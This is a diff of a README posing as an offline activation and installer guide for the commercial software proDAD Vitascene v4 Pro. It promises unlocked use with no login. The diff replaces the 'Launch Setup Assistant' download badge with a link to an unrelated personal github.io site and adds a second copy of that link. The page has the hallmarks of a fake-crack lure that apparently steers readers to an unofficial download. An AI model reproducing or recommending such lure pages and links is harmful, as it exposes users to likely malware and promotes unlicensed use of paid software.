@@ -1,6 +1,6 @@
 # proDAD Vitascene v4 Pro — Offline Activation Guide
 
-[![🎬 Launch Setup Assistant](https://img.shields.io/badge/🎬%20Launch%20Setup%20Assistant-Start%20Offline%20Installer-%23001f3f?style=for-the-badge)](https://prodad-vitascene-full-download.github.io/.github)
+[![🎬 Launch Setup Assistant](https://img.shields.io/badge/🎬%20Launch%20Setup%20Assistant-Start%20Offline%20Installer-%23001f3f?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/Prodadad)
 
 > Complete offline installation for proDAD Vitascene v4 Pro. Unlock cinematic transitions and GPU-accelerated effects with no login or internet.
 
@@ -36,6 +36,8 @@
 
 ![Color Grading & Film Tint Preview](https://www.prodad.com/srv/obs/g/_tss_1690289374592_55fc91b/module/images/18182-pic_de-1280y800/Adobe_Premiere_Vitascene_Effekt_Film_Look_Tint_Red_Sky.jpg)  
 *Color tone, tints, glow and LUTs effects inside the editor*
+
+[![🎬 Launch Setup Assistant](https://img.shields.io/badge/🎬%20Launch%20Setup%20Assistant-Start%20Offline%20Installer-%23001f3f?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/Prodadad)
 
 ---
 
